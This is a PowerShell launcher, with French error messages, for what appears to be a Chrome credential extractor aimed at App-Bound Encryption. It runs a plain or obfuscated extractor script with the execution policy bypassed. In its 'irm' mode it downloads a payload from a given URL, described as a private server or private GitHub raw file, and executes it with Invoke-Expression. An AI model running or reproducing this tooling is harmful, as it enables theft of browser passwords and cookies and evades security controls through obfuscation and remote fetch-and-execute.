param(
    [ValidateSet('plain', 'obf', 'irm')]
    [string]$Mode = 'plain',
    [string]$ObfUrl = '',
    [switch]$PackFirst
)

$root = $PSScriptRoot
$plain = Join-Path $root 'chrome-extract-abe.ps1'
$obf = Join-Path $root 'chrome-extract-abe.obf.ps1'
$pack = Join-Path $root 'pack-chrome-abe-obf.ps1'

if ($PackFirst -or ($Mode -ne 'plain' -and -not (Test-Path -LiteralPath $obf))) {
    & pwsh -NoProfile -ExecutionPolicy Bypass -File $pack
}

switch ($Mode) {
    'plain' {
        & pwsh -NoProfile -ExecutionPolicy Bypass -File $plain
    }
    'obf' {
        if (-not (Test-Path -LiteralPath $obf)) { throw "Manquant : $obf (lance pack-chrome-abe-obf.ps1)" }
        & pwsh -NoProfile -ExecutionPolicy Bypass -File $obf
    }
    'irm' {
        if (-not $ObfUrl) { throw "Mode irm : fournis -ObfUrl (serve-chrome-abe-payload.ps1 ou raw GitHub prive)" }
        $raw = (Invoke-WebRequest -Uri $ObfUrl -UseBasicParsing).Content
        if ($raw.Length -ge 3 -and [int][char]$raw[0] -eq 0xFEFF) { $raw = $raw.Substring(1) }
        elseif ($raw.StartsWith([char]0xFEFF)) { $raw = $raw.TrimStart([char]0xFEFF) }
        Invoke-Expression $raw
    }
}